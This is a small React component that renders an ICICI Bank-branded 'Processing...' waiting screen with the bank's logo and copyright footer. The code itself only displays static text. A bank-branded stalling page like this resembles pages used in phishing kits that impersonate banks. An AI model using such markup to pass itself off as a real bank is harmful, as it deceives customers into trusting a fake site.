import React from 'react';

const ProcessingPage = () => {
  return (
    <div className="container">
      <div className="header">
        <img src="/icici h.jpg" alt="ICICI Bank Logo" />
      </div>

      <div className="content">
        <h2>Processing...</h2>
        <div className="notification">
          <p>Please wait while we process your information.</p>
        </div>
        <div className="timer">Processing your request...</div>
      </div>

      <div className="footer">
        <p>&copy; ICICI Bank</p>
      </div>
    </div>
  );
};

export default ProcessingPage;
